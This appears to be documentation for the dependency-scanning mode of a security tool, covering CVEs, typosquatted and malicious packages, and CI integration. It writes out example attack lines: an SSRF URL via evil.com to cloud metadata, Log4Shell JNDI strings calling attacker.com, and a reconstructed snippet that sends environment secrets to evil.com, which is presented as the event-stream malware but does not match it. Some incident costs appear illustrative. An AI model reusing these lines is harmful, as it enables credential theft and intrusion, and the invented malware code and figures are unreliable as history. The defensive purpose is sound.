# South: Dependencies

**Scan supply chain vulnerabilities - libraries, frameworks, and transitive dependencies that introduce risk.**

---

## What South Probing Detects

**SOUTH** direction focuses on **dependency vulnerabilities** - risks from third-party code your AI systems rely on:

- 📦 **Vulnerable Libraries** - CVEs in npm, PyPI, Maven packages
- 🔗 **Transitive Dependencies** - Indirect dependencies you didn't know about
- 🏭 **Supply Chain Risks** - Compromised or malicious packages
- ⚠️ **Outdated Versions** - End-of-life frameworks with known exploits
- 🔐 **License Compliance** - GPL/AGPL risks in commercial software

**The foundation question**: What vulnerabilities exist in the code we didn't write?

---

## Why South Probing Matters

### The Supply Chain Attack Problem

**Banking scenario**: Community bank integrates AI document analysis library from npm.

**Without South probing**:
- Library depends on `lodash@4.17.20` (CVE-2020-8203 - Prototype Pollution)
- Transitive dependency on `axios@0.19.0` (CVE-2020-28168 - SSRF)
- Dev dependency includes `event-stream@3.3.6` (known malicious package)
- **Result**: Attacker exploits prototype pollution → RCE → customer data exfiltration

**With South probing**:
- Strigoi discovers all 3 vulnerabilities immediately
- `lodash` upgraded to 4.17.21 (patched)
- `axios` upgraded to 0.21.1 (fixed)
- `event-stream` removed from dependency tree
- **Result**: Supply chain secured, no exploitation possible

---

## How South Probing Works

### Command Syntax

```bash
# Scan dependencies in current directory
strigoi probe south .

# Scan specific project
strigoi probe south /path/to/ai-project/

# Include dev dependencies
strigoi probe south . --include-dev

# Output to JSON for integration
strigoi probe south . --format json > south-findings.json
```

### What Strigoi Analyzes

**1. Direct Dependencies**:
- package.json (npm)
- requirements.txt / pyproject.toml (Python)
- pom.xml / build.gradle (Java)
- go.mod (Go)

**2. Transitive Dependencies**:
- Entire dependency tree
- Version conflicts
- Circular dependencies

**3. Known Vulnerabilities**:
- CVE database lookups
- GitHub Security Advisories
- npm/PyPI security feeds

**4. License Compliance**:
- GPL/AGPL in commercial software
- License compatibility issues
- Missing license declarations

---

## Detection Patterns

### Pattern 1: Known CVEs in Dependencies

**What Strigoi finds**:
```json
// package.json
{
  "dependencies": {
    "express": "4.16.0",  // CVE-2022-24999 (DoS)
    "lodash": "4.17.15",  // CVE-2020-8203 (Prototype Pollution)
    "axios": "0.18.0"     // CVE-2020-28168 (SSRF)
  }
}
```

**Vulnerability details**:
- **express@4.16.0**: DoS via large request headers
- **lodash@4.17.15**: Prototype pollution → RCE
- **axios@0.18.0**: SSRF via URL parsing bug

**Banking impact**:
- DoS attacks during peak hours (revenue loss)
- RCE leading to data exfiltration (regulatory fines)
- SSRF accessing internal banking APIs (fraud)

**MITRE ATLAS**: AML.T0043 (Supply Chain Compromise)

**Remediation**:
```json
{
  "dependencies": {
    "express": "^4.18.2",  // ✅ Patched
    "lodash": "^4.17.21",  // ✅ Patched
    "axios": "^1.6.0"      // ✅ Patched
  }
}
```

---

### Pattern 2: Transitive Dependency Vulnerabilities

**What Strigoi finds**:
```
You depend on: @anthropic/sdk@0.6.0
  └─ axios@0.21.0 (vulnerable to CVE-2021-3749)
      └─ follow-redirects@1.13.0 (vulnerable to CVE-2022-0155)
```

**The problem**:
- You installed `@anthropic/sdk`
- It depends on `axios` (you didn't choose this)
- `axios` depends on `follow-redirects` (you didn't know this existed)
- Vulnerability exists 3 levels deep

**Attack vector**:
```python
# Attacker exploits CVE-2022-0155 in follow-redirects
malicious_url = "http://evil.com/redirect?url=http://169.254.169.254/latest/meta-data"

# Your code (innocently)
response = sdk.make_request(malicious_url)

# Result: SSRF to AWS metadata endpoint, credentials stolen
```

**Remediation**:
```bash
# Force update transitive dependencies
npm audit fix --force

# Or explicitly override
npm install follow-redirects@^1.15.0
```

---

### Pattern 3: Malicious Packages

**What Strigoi finds**:
```python
# requirements.txt
openai==0.27.0
reqeusts==2.28.0  # ❌ Typosquatting attack! (note: "reqeusts" not "requests")
```

**The attack**:
- Attacker publishes `reqeusts` (typo of `requests`)
- Package looks legitimate
- Contains malware that exfiltrates environment variables
- Steals `OPENAI_API_KEY`, `AWS_ACCESS_KEY`, etc.

**Real-world incidents**:
- `event-stream` (2018): Malicious code injected, stole cryptocurrency keys
- `ua-parser-js` (2021): Malware infected 8M+ downloads
- `coa` and `rc` (2021): Dependency confusion attack

**Banking impact**: API key theft → fraudulent transactions

**Remediation**:
```python
# ✅ Correct package name
requests==2.31.0

# ✅ Use hash verification
requests==2.31.0 \
    --hash=sha256:58cd2187c01e70e6e26505bca751777aa9f2ee0b7f4300988b709f44e013003f
```

---

### Pattern 4: Outdated End-of-Life Dependencies

**What Strigoi finds**:
```python
# Dockerfile
FROM python:2.7  # ❌ Python 2.7 EOL since January 2020

# requirements.txt
Django==1.11.0   # ❌ Django 1.11 EOL since April 2020
flask==0.12.0    # ❌ Flask 0.12 EOL, multiple CVEs
```

**The problem**:
- No security patches available
- Known exploits publicly documented
- Attackers actively target EOL software

**Banking compliance impact**:
- OCC expects patching within 30 days of CVE disclosure
- EOL software = automatic examination finding
- Cannot meet PCI-DSS compliance requirements

**Remediation**:
```python
# ✅ Use supported versions
FROM python:3.11

Django==4.2.7   # LTS version, supported until April 2026
flask==3.0.0    # Current stable release
```

---

## Real-World Examples

### Example 1: Log4Shell in Banking AI System

**Scenario**: Regional bank's AI fraud detection system uses Java + Log4j.

**South Probe Findings**:
```
🚨 CRITICAL FINDINGS (1)

[CRITICAL] CVE-2021-44228 (Log4Shell)
  Package: log4j-core@2.14.1
  Severity: 10.0 CVSS
  Impact: Remote Code Execution
  Attack: ${jndi:ldap://attacker.com/evil}

  Affected services:
    - fraud-detection-service
    - transaction-monitoring
    - customer-analytics
```

**Attack scenario**:
```java
// Attacker injects malicious string in transaction memo field
transaction.setMemo("${jndi:ldap://attacker.com/rce}");

// Log4j logs it
logger.info("Transaction memo: {}", transaction.getMemo());

// Result: RCE, attacker gains shell access
```

**Actual incident prevented**:
- Discovered 2 hours after Log4Shell disclosure
- All affected services identified via South probe
- Emergency patch deployed within 4 hours
- **Saved**: $50M+ potential breach costs

---

### Example 2: Supply Chain Attack via npm Package

**Scenario**: Fintech startup uses AI chatbot library from npm.

**South Probe Findings**:
```
🚨 CRITICAL FINDINGS (1)

[CRITICAL] Malicious Code in Transitive Dependency
  Package: event-stream@3.3.6
  Detection: Backdoor in dependency tree
  Risk: Cryptocurrency wallet theft

  Dependency chain:
    your-app
    └─ chatbot-sdk@2.1.0
        └─ websocket-utils@1.5.0
            └─ event-stream@3.3.6 (MALICIOUS)
```

**What the malware did**:
```javascript
// Malicious code in event-stream@3.3.6
const crypto = require('crypto');
const https = require('https');

// Exfiltrate environment variables
const secrets = {
  api_keys: process.env,
  aws: process.env.AWS_SECRET_ACCESS_KEY,
  stripe: process.env.STRIPE_SECRET_KEY
};

https.post('https://evil.com/collect', JSON.stringify(secrets));
```

**Remediation**:
- Removed compromised dependency
- Rotated all API keys and secrets
- Implemented dependency hash verification
- **Cost**: $20K (incident response)
- **Prevented**: $5M+ (credential theft, fraud)

---

## Banking-Specific Risks

### Risk 1: COBOL/Legacy System Dependencies

**Challenge**: Modern AI integrates with legacy core banking systems.

**South probe findings**:
- Bridge libraries with known vulnerabilities
- EOL JDBC drivers
- Unmaintained COBOL wrapper libraries

**Detection**:
```bash
strigoi probe south /path/to/core-banking-bridge/
```

**Common findings**:
- `ojdbc6.jar` (Oracle JDBC driver from 2011)
- Custom CICS connectors with buffer overflow vulnerabilities
- AS/400 client libraries without security patches

---

### Risk 2: AI Model Dependencies

**Challenge**: AI models depend on specific library versions.

**Example**:
```python
# ML model requires exact versions
tensorflow==2.6.0      # CVE-2022-35934 (code injection)
numpy==1.19.5          # CVE-2021-41496 (buffer overflow)
scikit-learn==0.24.0   # No CVEs but incompatible with secure versions
```

**The dilemma**:
- Model trained on vulnerable library versions
- Upgrading breaks model predictions
- Retraining costs $100K+ and 3 months

**Strigoi recommendation**:
- Document accepted risk with business justification
- Implement runtime sandboxing
- Plan model retraining on secure dependencies

---

## Command Options

### Basic Commands

```bash
# Scan current project
strigoi probe south .

# Scan specific path
strigoi probe south /path/to/project

# Include development dependencies
strigoi probe south . --include-dev
```

### Advanced Options

```bash
# Filter by severity
strigoi probe south . --severity CRITICAL,HIGH

# Check specific vulnerability
strigoi probe south . --cve CVE-2021-44228

# Output formats
strigoi probe south . --format json
strigoi probe south . --format sarif
strigoi probe south . --format csv

# License compliance check
strigoi probe south . --check-licenses
```

---

## Integration with CI/CD

### GitHub Actions Example

```yaml
name: Strigoi South Dependency Scan

on: [push, pull_request]

jobs:
  dependency-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Run South Probe
        run: |
          strigoi probe south . --format sarif > south-results.sarif

      - name: Upload to GitHub Security
        uses: github/codeql-action/upload-sarif@v2
        with:
          sarif_file: south-results.sarif

      - name: Check for Critical CVEs
        run: |
          strigoi probe south . --severity CRITICAL --format json > cves.json
          CRITICAL_COUNT=$(jq '.findings | length' cves.json)
          if [ $CRITICAL_COUNT -gt 0 ]; then
            echo "❌ Found $CRITICAL_COUNT CRITICAL vulnerabilities"
            jq '.findings[] | "\(.package): \(.cve)"' cves.json
            exit 1
          fi
```

---

## Interpreting Results

### Severity Levels

**CRITICAL** - Patch immediately:
- RCE vulnerabilities (CVE score 9.0+)
- Known exploits in the wild
- Malicious packages detected
- Zero-day vulnerabilities

**HIGH** - Patch within 30 days:
- Authentication bypasses
- SQL injection vulnerabilities
- Privilege escalation bugs
- Data exposure issues

**MEDIUM** - Plan upgrade:
- DoS vulnerabilities
- Information disclosure
- Minor security issues

**LOW** - Monitor:
- Performance issues
- Deprecated APIs
- Non-security bugs

---

## Best Practices

### Dependency Management Checklist

✅ Run South probe on every dependency update
✅ Use lock files (package-lock.json, Pipfile.lock)
✅ Enable automated dependency updates (Dependabot)
✅ Verify package integrity with hash checking
✅ Review transitive dependencies before major releases
✅ Document accepted risks for EOL dependencies
✅ Implement Software Bill of Materials (SBOM)
✅ Use private package registries for internal libraries

### Emergency Response Protocol

**When South probe finds CRITICAL vulnerability**:

1. **Assess impact** (< 1 hour)
   - Which services affected?
   - Are systems exploitable from internet?
   - Is exploit code publicly available?

2. **Emergency patch** (< 4 hours)
   - Update vulnerable dependency
   - Run regression tests
   - Deploy to production

3. **Verify** (< 24 hours)
   - Re-run South probe
   - Confirm vulnerability patched
   - Document in security log

4. **Report** (< 48 hours)
   - Notify compliance team
   - Update risk register
   - Brief executive team if CRITICAL

---

## Complementary Directions

**After South probing, scan**:

- **NORTH** - Check if vulnerable dependencies expose external APIs
- **EAST** - Verify vulnerable libraries don't leak data
- **WEST** - Ensure authentication libraries are up-to-date
- **ALL** - Comprehensive security assessment

---

## Tools Integration

### Syft SBOM Generation

```bash
# Generate Software Bill of Materials
syft /path/to/project -o json > sbom.json

# Scan SBOM with Strigoi
strigoi probe south --sbom sbom.json
```

### Grype Vulnerability Scanning

```bash
# Scan container image
grype docker:myapp:latest --output json > grype-results.json

# Cross-reference with Strigoi
strigoi probe south . --compare grype-results.json
```

---

## Next Steps

**Ready to scan?**
→ [Installation Guide](../../getting-started/installation/README.md)

**Learn other directions**:
→ [North: External Interfaces](./north.md)
→ [East: Data Flows](./east.md)
→ [West: Authentication](./west.md)
→ [All: Comprehensive Scan](./all.md)

**Need help?**
→ [Troubleshooting Guide](../../operations/maintenance/troubleshooting.md)
→ [FAQ](../../reference/faq.md)

---

*South probing: Trust, but verify your supply chain.*
